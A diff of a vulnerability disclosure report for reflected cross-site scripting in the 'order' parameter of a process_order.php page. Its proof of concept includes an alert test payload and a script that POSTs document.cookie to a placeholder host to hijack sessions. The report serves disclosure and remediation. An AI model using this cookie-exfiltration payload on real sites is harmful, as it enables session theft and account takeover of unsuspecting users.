@@ -19,7 +19,8 @@
 > Reflected cross-site scripting (XSS) is a type of web vulnerability that occurs when a web application fails to properly sanitize user input, allowing an attacker to inject malicious code into the application's response to a user's request. When the user's browser receives the response, the malicious code is executed, potentially allowing the attacker to steal sensitive information or take control of the user's account.
 
 ### Affected Page: 
-> process_order.php
+> Vulnerable Page: process_order.php
+
 > In this page order parameter are vulnerable to Reflected Cross Site Scripting Attack
 
 ### Description:
@@ -27,11 +28,15 @@
 
 ### Proof of Concept:
 > Initially, I tried to verify the XSS attack, I used standard XSS payload <script>alert("Verification");</script> and the Below Image confirmed that, the parameter is vulnerable to reflected XSS.
+
 > Payload: process_order.php?order=<script>alert(1)<%2fscript>mjii5
+
 > ![image](https://user-images.githubusercontent.com/123810418/219716828-62b529c9-8366-4051-8b2c-f9065b158089.png)
 
 > Based on that, I have decided to make it realistic attack and use burp colloborator to hijack user cookie:
+
 > Payload: process_order.php?order=<script>fetch(%27http://dummyurl/%27,{method:%27POST%27,mode:%27no-cors%27,body:document.cookie});</script>
+
 >  ![image](https://user-images.githubusercontent.com/123810418/219717379-d085a7ec-29d4-4d2c-ba19-69e5011891e8.png)
 
 ### Recommendation: 
